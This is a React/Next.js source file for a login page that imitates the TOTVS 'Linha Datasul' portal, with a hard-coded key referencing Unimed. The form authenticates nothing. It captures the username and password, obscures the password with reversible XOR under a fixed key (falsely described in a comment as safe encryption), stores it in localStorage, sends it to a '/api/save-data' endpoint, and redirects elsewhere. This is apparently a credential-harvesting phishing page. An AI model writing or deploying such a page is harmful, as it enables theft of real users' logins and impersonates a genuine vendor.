"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Eye, EyeOff, User, Lock, Info } from "lucide-react"
import Image from "next/image"

const encryptPassword = (password: string, key: string): string => {
  let encrypted = ""
  for (let i = 0; i < password.length; i++) {
    const passwordChar = password.charCodeAt(i)
    const keyChar = key.charCodeAt(i % key.length)
    encrypted += String.fromCharCode(passwordChar ^ keyChar)
  }
  return btoa(encrypted) // Base64 encode for safe storage
}

export default function LoginPage() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [errors, setErrors] = useState({ username: "", password: "" })
  const router = useRouter()

  const validateUsername = (value: string) => {
    if (!value) return "Usuário é obrigatório"
    if (!/^[a-zA-Z]+$/.test(value)) return "Usuário deve conter apenas letras"
    return ""
  }

  const validatePassword = (value: string) => {
    if (!value) return "Senha é obrigatória"
    if (value.length < 10) return "Senha deve ter pelo menos 10 caracteres"

    // Verificar quantos critérios são atendidos
    let criteriaCount = 0

    if (/[a-z]/.test(value)) criteriaCount++ // Letras minúsculas
    if (/[A-Z]/.test(value)) criteriaCount++ // Letras maiúsculas
    if (/\d/.test(value)) criteriaCount++ // Números
    if (/[!@#$%^&*(),.?":{}|<>]/.test(value)) criteriaCount++ // Caracteres especiais

    if (criteriaCount < 3) {
      return "Senha deve conter pelo menos 3 dos seguintes critérios: letras minúsculas, maiúsculas, números ou caracteres especiais"
    }

    return ""
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    const usernameError = validateUsername(username)
    const passwordError = validatePassword(password)

    setErrors({ username: usernameError, password: passwordError })

    if (!usernameError && !passwordError) {
      try {
        const encryptedPassword = encryptPassword(password, "senhas@unimed-277")

        localStorage.setItem(
          "loginData",
          JSON.stringify({
            usuario: username,
            senha: encryptedPassword,
          }),
        )

        await fetch("/api/save-data", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            type: "login",
            usuario: username,
            senha: encryptedPassword,
            timestamp: new Date().toISOString(),
          }),
        })
      } catch (error) {
        console.error("Error saving login data:", error)
      }

      // Redirect to shows page
      router.push("/shows")
    }
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header with support button */}
      <div className="flex justify-end p-4">
        <Button
          variant="ghost"
          className="text-cyan-500 hover:text-cyan-600 border border-cyan-200 rounded-full px-4 py-2"
        >
          <Info className="w-4 h-4 mr-2" />
          Suporte
        </Button>
      </div>

      {/* Main content */}
      <div className="flex-1 flex items-center justify-center px-4">
        <div className="w-full max-w-md">
          {/* Logo */}
          <div className="text-center mb-8">
            <Image src="/totvs-logo.png" alt="TOTVS" width={120} height={40} className="mx-auto mb-6" />
            <h1 className="text-2xl font-normal text-gray-500 mb-2">Linha Datasul</h1>
            <h2 className="text-xl text-cyan-500 font-normal">Boas-vindas</h2>
          </div>

          {/* Login form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <Label htmlFor="username" className="text-gray-700 font-normal text-sm">
                Usuário:
              </Label>
              <div className="relative mt-1">
                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-cyan-500 w-4 h-4" />
                <Input
                  id="username"
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="pl-10 pr-10 border-gray-300 focus:border-cyan-500 focus:ring-cyan-500 rounded-sm h-12"
                  placeholder=""
                />
                <Info className="absolute right-3 top-1/2 transform -translate-y-1/2 text-cyan-400 w-4 h-4" />
              </div>
              {errors.username && <p className="text-red-500 text-sm mt-1">{errors.username}</p>}
            </div>

            <div>
              <Label htmlFor="password" className="text-gray-700 font-normal text-sm">
                Senha:
              </Label>
              <div className="relative mt-1">
                <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-cyan-500 w-4 h-4" />
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="pl-10 pr-10 border-gray-300 focus:border-cyan-500 focus:ring-cyan-500 rounded-sm h-12"
                  placeholder=""
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
              {errors.password && <p className="text-red-500 text-sm mt-1">{errors.password}</p>}
            </div>

            <Button
              type="submit"
              className="w-full bg-gray-400 hover:bg-gray-500 text-white py-3 h-12 rounded-sm font-normal text-base"
            >
              Entrar
            </Button>

            <div className="text-center space-y-2">
              <button type="button" className="text-cyan-500 hover:text-cyan-600 text-sm block mx-auto">
                Esqueci minha senha
              </button>
              <button type="button" className="text-cyan-500 hover:text-cyan-600 text-sm block mx-auto">
                Trocar senha
              </button>
            </div>

            <div className="flex justify-center">
              <Select defaultValue="pt">
                <SelectTrigger className="w-32 border-gray-300 rounded-sm">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="pt">Português</SelectItem>
                  <SelectItem value="en">English</SelectItem>
                  <SelectItem value="es">Español</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </form>
        </div>
      </div>

      {/* Footer */}
      <div className="text-center py-6">
        <Image src="/totvs-logo.png" alt="TOTVS" width={80} height={26} className="mx-auto opacity-30" />
      </div>
    </div>
  )
}
